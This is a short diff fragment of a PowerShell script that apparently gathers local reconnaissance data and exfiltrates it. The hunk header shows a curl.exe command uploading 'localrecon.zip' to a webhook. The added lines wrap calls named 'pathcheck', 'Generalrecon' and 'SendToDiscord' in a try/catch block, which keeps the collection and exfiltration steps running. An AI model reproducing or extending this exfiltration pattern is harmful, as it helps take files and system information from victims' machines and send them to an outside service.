@@ -383,6 +383,11 @@ curl.exe -H "Content-Type: multipart/form-data" -F "file1=@localrecon.zip" $WEBH
 
 }    
 
-pathcheck
-Generalrecon
-SendToDiscord
+try {
+    pathcheck
+    Generalrecon
+    SendToDiscord
+}
+catch {
+    Write-Error $_
+}
